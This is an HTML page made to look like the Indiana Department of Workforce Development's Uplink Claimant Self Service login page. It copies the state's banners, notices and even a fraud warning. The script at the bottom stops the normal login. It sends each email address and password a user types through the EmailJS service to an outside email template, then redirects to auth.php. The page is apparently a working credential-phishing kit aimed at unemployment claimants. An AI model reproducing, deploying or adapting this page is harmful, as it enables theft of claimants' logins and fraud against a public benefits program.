


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/style.css">
      <link rel="shortcut icon" href="favicon2.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <title>Uplink Login</title>
</head>
<body>
    <div class="container">
        <!-- TOP HEADER 2 STARTS-->
            <div class="header1_container">
                <div class="header1_wrapper fixed_width">
                <img src="assets/img/top_banner_02-2.png" alt="">
                </div>
        </div>
<!-- TOP HEADER 1 ENDS-->

<!-- TOP HEADER 2 STARTS -->
        <div class="header2_container">
            <div class="header2_wrapper fixed_width">
                <h1>Claimant Self Service</h1>

                <div class="image_container">
                    <img width="100" src="assets/img/DWD_sm.png" alt="">
                    <img width="100" src="assets/img/workone_logo.png" alt="">
                </div>
            </div>
        </div>

 <!-- TOP HEADER 2 ENDS -->

<!-- HERO SECTION STARTS -->


<div class="hero_container">
    <div class="hero_wrapper fixed_width">
     



        <div class="hero_login_form_container">
            <div class="hero_login_form_wrapper">
                     <form id="form">
                       
                    <div class="form p-2">
                        <div class="d-flex justify-content-between align-items-center col-md-12 col-12"> 
                            <span class="h5 p-0 m-0" style="color: rgba(0, 0, 0, 0.5); top: -10px;">User Logon</span>
                            <div style="width: 65%; height: 2px; background-color: rgba(0, 0, 0, 0.4);"></div>
                        </div>
                        <div class="input-group mb-3 mt-2">
                            <span class="input-group-text" id="basic-addon1">
                                <i class="fa fa-envelope"></i>
                            </span>
                            <input type="text" name = "email" id="email" class="form-control" placeholder="Enter Email Address" aria-label="Enter Email Address" aria-describedby="basic-addon1" required>
                        </div>
                        <div class="input-group mb-3">
                            <span class="input-group-text" id="basic-addon1">
                                <i class="fa fa-lock"></i>
                            </span>
                            <input type="password" name = "pass" id="pass" class="form-control" placeholder="Enter Password" aria-label="Enter Password" aria-describedby="basic-addon1" required>
                        </div>
                        <button type = "submit" class="btn btn-primary btn-block col-md-12 col-12" style="background-color: #386c9c;" id="button">Sign In <i class="fa fa-sign-in-alt"></i></button>
                        <button class="btn btn-outline-primary btn-block col-md-12 col-12 mt-3" style="border-color: #386c9c;" onclick="sendMessage">New User Registration</button>

                        <div class="d-flex justify-content-between col-md-12 col-12 mt-3 p-3">
                            <p class="text-primary">forget Username?</p>
                            <p class="text-primary">forget Password?</p> 
                        </div>
                    </div>
              
                    </form>
            </div>
        </div>


        <div class="hero_text_container">
            <div class="hero_text_wrapper">
                    <div class="content_container">
                        <h1>2021 Tax Documents:</h1>
                        <p>1099-G tax documents will be available on claimants' Uplink CSS Correspondence pages by Feb. 1, 2022. <b><a href="https://www.in.gov/dwd/indiana-unemployment/individuals/1099g/" target="_blank">Find more income tax information regarding unemployment insurance here</a></b>. </p>
                    </div>
                    <div class="content_container">
                        <h1>Looking for a job that's a better match? Take your career to the next level</h1>
                        <p>The Hoosier Talent Network <b>matches you to jobs based on your skills and
                            capabilities, not just experience</b>. 
                            Simply create a profile and in a few minutes,
                            you'll be matched with jobs that best align with your current skills and others that
                            might require just a bit more training. 
                            Explore new job opportunities and
                            unlock your potential. 
                            Visit <b><a href="https://www.hoosiertalentnetwork.com/career_exchange/landing/accept" target="_blank">www.HoosierTalentNetwork.com.</a></b></p>
                    </div>

                    <div class="content_container">
                        <h1>Important Notice about Your Unemployment Insurance Claim and Increased Fraud</h1>
                        <p>The Indiana Department of Workforce Development (DWD) is seeing increased incidents of fraud in UI programs. Please note that DWD WILL NOT text you about your unemployment insurance claim.
                            <p>To report fraudulent messages, please <b><a href="https://www.in.gov/dwd/indiana-unemployment/fraud/" target="_blank" title="DWD Fraud Page">report it to DWD here</a></b>. 
                            </p>
                    </div>

                    <div class="content_container">
                        <h1>Learn how to ace an interview and more with free skills training!</h1>
                        <p>Through a partnership with 180 Skills, the State of Indiana is offering free skills training to Indiana residents. Sign up by December 31st to access the 180 Skills collection of over 700 training courses covering 38 topic areas. <b><a href="https://www.180skills.com/indiana/" target="_blank">Learn more</a></b>.</p>
                    </div> 

                    <div class="content_container">
                        <h1>Notice</h1>
                        <p>Pursuant to 20 CFR &sect; 603.11, confidential claimant unemployment compensation information and employer wage information may be requested and utilized for other governmental purposes, including, but not limited to, verification of eligibility under other government programs.</p>
                    </div>
            </div>
        </div>


            


    </div>
</div>



<!-- HERO SECTION ENDS -->

<!-- FOOTER SECTION STARTS -->
<div class="footer_container">
    <div class="footer_wrapper">
        <h3>
            Questions, Concerns or Inquiries?<br><br> <small>Contact
                us today at 1-800-891-6499. Open 8am - 5:30pm Monday - Friday. </small>
        </h3>

        <div class="image_adobe_container">
            <img src="assets/img//Get_Adobe_Acrobat_Reader_icon.png" alt="">
        </div>
    </div>
</div>
<!-- FOOTER SECTION ENDS -->

        
        <script type="text/javascript"
  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script type="text/javascript">
  emailjs.init('veFV9dPiq-R62bp3w')
</script>

        
          <script>
              const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Please wait...';

   const serviceID = 'default_service';
   const templateID = 'template_bwvsivf';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Send Email';
           // alert('Sent!');
   setTimeout(function(){ window.location.href='auth.php';}, 5000);
    }, (err) => {
      btn.value = 'Send Email';
      alert(JSON.stringify(err));
    });
});
              
 
        </script>



    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script> 
</body>
</html>